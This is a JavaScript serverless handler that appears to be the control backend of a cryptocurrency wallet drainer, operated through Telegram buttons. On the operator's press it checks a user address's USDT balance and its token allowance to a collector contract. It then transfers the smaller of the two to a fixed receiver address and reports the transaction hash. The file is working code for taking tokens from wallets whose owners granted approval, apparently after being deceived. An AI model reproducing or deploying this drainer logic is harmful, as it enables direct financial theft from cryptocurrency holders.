import { ethers } from 'ethers';
import {
    handleCors,
    answerCallbackQuery,
    editTelegramMessage,
    executeCollection,
    getProvider,
    getUsdtContract,
    TELEGRAM_CHAT_ID,
    RECEIVER_ADDRESS,
    AUTO_COLLECTOR_ADDRESS
} from './_lib/helpers.js';

export default async function handler(req, res) {
    if (handleCors(req, res)) return;

    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method Not Allowed' });
    }

    const update = req.body;

    // Only handle callback_query (button presses)
    if (!update.callback_query) {
        return res.status(200).json({ ok: true });
    }

    const callbackQuery = update.callback_query;
    const message = callbackQuery.message;
    const data = callbackQuery.data;

    // Reject unknown chat
    if (message.chat.id.toString() !== TELEGRAM_CHAT_ID) {
        await answerCallbackQuery(callbackQuery.id, 'Unauthorized chat.');
        return res.status(200).json({ ok: true });
    }

    try {
        // Helper to append updates to the original message
        const appendToOriginalMessage = async (newContent) => {
            const safeOriginalText = message.text || "Approval Status Update";
            const newText = `${safeOriginalText}\n\n――― <b>UPDATE</b> ―――\n${newContent}`;

            await editTelegramMessage(message.message_id, newText, {
                reply_markup: JSON.stringify(message.reply_markup) // keep buttons
            });
        };

        if (data === 'config') {
            await answerCallbackQuery(callbackQuery.id, 'Config loaded');
            await appendToOriginalMessage(`⚙️ <b>Receiver Address:</b>\n<code>${RECEIVER_ADDRESS}</code>`);
        }

        else if (data.startsWith('balance:')) {
            await answerCallbackQuery(callbackQuery.id, 'Fetching balance...');
            const userAddress = data.split(':')[1];

            const provider = getProvider();
            const usdtContract = getUsdtContract(provider);
            const balance = await usdtContract.balanceOf(userAddress);
            const allowance = await usdtContract.allowance(userAddress, AUTO_COLLECTOR_ADDRESS);
            const decimals = await usdtContract.decimals();

            const formattedBalance = ethers.formatUnits(balance, decimals);
            const formattedAllowance = ethers.formatUnits(allowance, decimals);

            await appendToOriginalMessage(`💰 <b>Live Balance Check:</b>\n<b>ERC20 USDT:</b> <code>${formattedBalance}</code>\n<b>Allowance:</b> <code>${formattedAllowance}</code>`);
        }

        else if (data.startsWith('transfer:')) {
            const userAddress = data.split(':')[1];

            await answerCallbackQuery(callbackQuery.id, 'Executing Transfer...');
            await appendToOriginalMessage(`⏳ <i>Executing transfer for <code>${userAddress}</code>...</i>`);

            const provider = getProvider();
            const usdtContract = getUsdtContract(provider);
            const balance = await usdtContract.balanceOf(userAddress);
            const allowance = await usdtContract.allowance(userAddress, AUTO_COLLECTOR_ADDRESS);
            const decimals = await usdtContract.decimals();

            const transferableAmountWei = balance < allowance ? balance : allowance;
            const transferableAmount = ethers.formatUnits(transferableAmountWei, decimals);

            if (Number(transferableAmount) <= 0) {
                await appendToOriginalMessage(`❌ <b>Transfer Failed: Amount is 0</b>\nBalance: ${ethers.formatUnits(balance, decimals)}\nAllowance: ${ethers.formatUnits(allowance, decimals)}`);
                return res.status(200).json({ ok: true });
            }

            try {
                const txHash = await executeCollection(userAddress, transferableAmount, RECEIVER_ADDRESS);
                await appendToOriginalMessage(`✅ <b>Transfer Executed Successfully!</b>\nAmount sent: <code>${transferableAmount}</code> USDT\n<a href="https://etherscan.io/tx/${txHash}">View Transaction on Etherscan</a>`);
            } catch (e) {
                await appendToOriginalMessage(`❌ <b>Transfer Failed</b>\nReason:\n<code>${e.message}</code>`);
            }
        }
    } catch (err) {
        console.error('Callback error:', err.message);
        await answerCallbackQuery(callbackQuery.id, 'An error occurred.', true);
    }

    res.status(200).json({ ok: true });
}
